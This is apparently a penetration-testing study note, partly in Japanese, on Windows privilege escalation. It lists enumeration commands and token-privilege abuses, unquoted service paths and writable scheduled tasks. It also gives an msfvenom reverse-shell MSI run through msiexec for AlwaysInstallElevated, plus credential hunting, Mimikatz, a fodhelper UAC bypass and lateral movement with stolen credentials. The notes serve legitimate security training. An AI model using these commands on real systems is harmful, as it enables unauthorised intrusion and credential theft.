---
title: Windows
parent: Privilege Escalation
grand_parent: Red Team
nav_order: 2
---
# Windows Privilege Escalation

---

# Goal

## Local Privilege Escalation

- Local Administrator / SYSTEM privileges
- Local Administrators
- Dump Local / Domain User credentials
- Access protected resources

## Domain Privilege Escalation

- Obtain Domain Admin privileges
- Abuse Active Directory misconfigurations
- Reuse Kerberos tickets / hashes
- Pivot across domain systems

---

# Attack Flow

Initial foothold
→ Discovery
→ Identify misconfiguration
→ ☠ exploit:
→ Administrator / SYSTEM / Administrators
→ Domain Pivot

---
# When using a low-privilege user

## System Enumeration

```powershell
hostname
```

```powershell
systeminfo
```

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName
```
![](../../assets/images/Pasted%20image%2020260507131310.png)

### 🕵 Check: 

- OS version is vulnerable or not
- hostname
- installed patches
- AV / Defender status

### ☠ exploit:
### [Blue Hammer](../99_attack_repo/201-250_win-vuln/201_win_blue-hammer.md)

---

## User & Group Enumeration

```powershell
net user
```

```powershell
net user /domain
```

```powershell
Get-LocalUser
```
### 🕵 Check: 

- Naming Conventions
### 🔨Create 

- users list

```powershell
net localgroup administrators
```

```powershell
net group /domain
```

```powershell
Get-LocalGroup
```

```powershell
Get-LocalGroupMember adminteam
```

---

## Current User Pivilege

```powershell
whoami /priv
```

### 🕵 Check: 

👉 If enabled: SeImpersonatePrivilege 

-> [Exploit](../99_attack_repo/251-300_win-mis/251_seimpersonate-privilege.md)

- GodPotate
- PrintSpoofer
- JuicyPotato
- RoguePotato


👉 If enabled: SeBackupPrivilege

-> [Exploit](../99_attack_repo/251-300_win-mis/252_sebackup-privilege)

- SAM / SYSTEM Copy


👉 If enabled: SeManageVolumePrivilege

-> [Exploit](../99_attack_repo/251-300_win-mis/254_semanagevolumeprivilege)

### Group

```powershell
whoami /groups
```

### 🕵 Check: 

- local admins
- interesting privileged groups (Example: IT Management Groups)
- service accounts
- RDP users


---

## PowerShell History
### PowerShell Transcriptionに残されたクレデンシャル
Powershellのログ記録メカニズム
- PowerShell Transcription　肩越しのトランスクリプション
- PowerShell Script Block Logging.

```powershell
Get-History
```

```powershell
Clear-History
```

Clear-History は PSReadline によって記録されたコマンド履歴を消去しない

```powershell
(Get-PSReadlineOption).HistorySavePath
```

```powershell
type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

```powershell
type C:\Users\Public\Transcripts\transcript01.txt
```

Enter-PSSession入力時に残されたクレデンシャルが表示される場合がある

### クレデンシャルを利用した横展開
```powershell
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
whoami
```

バインドシェルでWinRM経由でPowerShellリモートセッションを作成すると、予期しない動作が発生する可能性がある（コマンドがうまく反応しない等）。
そのためevel-winrmなどを使う
管理者は、 Set-PSReadlineOptionコマンドレットで -HistorySaveStyleオプションをSaveNothingに設定することで、PSReadlineによるコマンドの記録を阻止できる

---

## Environment

### env

```powershell
Get-ChildItem Env:
```

```powershell
set
```

### Folders and files located directly under the C:\

```powershell
dir C:\
```
### 🕵 Check: 

- credentials
- API keys
- tokens
- writable PATH entries

---

## ディレクトリ権限確認

```powershell
icacls "C:\Program Files\App"
```

### 再帰的確認

```powershell
icacls C:\Tools /T
```

### 現在のユーザーが書けるか確認

```powershell
icacls C:\Temp | findstr "(M) (F) (W)"
```

権限昇格で特に重要なのは以下の項目に (M) や (F) が付いている場所

- BUILTIN\Users
- Everyone
- Authenticated Users

---

## Services

```powershell
Get-Service
```

```powershell
sc qc <service>
```

```powershell
accesschk.exe -uwcqv "Authenticated Users" *
```

## 👉 Check:

- unquoted service paths
- writable service binaries
- weak permissions

### ☠ exploit:

#### Unquoted Service Path

Examples of Windows attempting to find the correct path for a service that is not enclosed in quotes.

```
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
```

```text
C:\Program Files\Vuln App\service.exe
```

Place malicious binary:

```text
C:\Program.exe
```

Restart service.

---

## Scheduled Tasks

```powershell
Get-ScheduledTask
```

```powershell
Get-Process backup -ErrorAction SilentlyContinue | Watch-Command -Difference -Continuous -Seconds 30
```

```powershell
schtasks /query /fo LIST /v
```

### 🕵 Check: 

- writable scripts
- stored credentials
- SYSTEM tasks

### ☠ exploit:

#### Replace writable script

```powershell
copy shell.ps1 backup.ps1
```

---

## [AlwaysInstallElevated]()

```powershell
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
```

```powershell
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
```

### 👉 Check:

```text
AlwaysInstallElevated = 1
```

### ☠ exploit:

#### Generate MSI

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f msi > shell.msi
```

#### Execute

```powershell
msiexec /quiet /qn /i shell.msi
```

---

## Credential Hunting

### Files

```powershell
dir /s *pass* 2>$null
```

```powershell
findstr /si password *.txt *.ini *.config
```

### Resgstry

```powershell
reg query HKLM /f password /t REG_SZ /s
```

## 🕵 Check: 

- config files
- unattended installs
- browser creds
- scripts
- RDP history

## ☠ exploit:

### WinPEAS findings

Reuse discovered credentials.

---

## Automated Enumeration

## winPEAS

```powershell
winpeas.exe
```

## PowerView.ps1


## 🕵 Check: 

- services
- credentials
- token privileges
- scheduled tasks
- registry findings

---

# Post-Exploitation / Elevated Phase

Exploration for Horizontal Expansion

---

##  [Mimikatz](../tools/8_mimikatz.md)

```powershell
.\mimikatz.exe
```

### 👉 Check:
- Other userPlain / Hash Password

---

##  UAC Bypass

```powershell
whoami /groups
```

## 🕵 Check: 

- local admin membership
- medium integrity shell
- `C:\Windows\System32\fodhelper.exe` is writeable

## ☠ exploit:

### fodhelper

```powershell
fodhelper.exe
```

---

## Kerberos / AD Enumeration

```powershell
setspn -T <DOMAIN> -Q */*
```

```powershell
nltest /domain_trusts
```

```powershell
klist
```

### 🕵 Check: 

- SPNs
- trusts
- cached tickets
- delegation

## Lateral Movemnt

Use the credentials you obtained to move to the next device
## Services

- SMB
- WinRM
- RDP
- MSSQL
- Kerberos
